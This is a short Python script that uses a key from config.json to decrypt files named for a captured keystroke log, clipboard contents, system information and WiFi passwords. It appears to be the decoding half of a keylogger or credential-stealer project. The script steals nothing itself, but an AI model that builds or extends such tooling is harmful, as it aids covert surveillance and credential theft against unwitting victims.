from cryptography.fernet import Fernet
import json

with open('config.json') as f:
    config = json.load(f)
    
    
key = config["key"]

system_information_e = 'e_systeminfo.txt'
clipboard_information_e = 'e_clipboard.txt'
keys_information_e = 'e_key_log.txt'
wifi_information_e = 'e_wifi_passwords.txt'


encrypted_files = [system_information_e, clipboard_information_e, keys_information_e, wifi_information_e]
count = 0


for decrypting_files in encrypted_files:

    with open(encrypted_files[count], 'rb') as f:
        data = f.read()

    fernet = Fernet(key)
    decrypted = fernet.decrypt(data)

    with open("decryption.txt", 'ab') as f:
        f.write(decrypted)

    count += 1
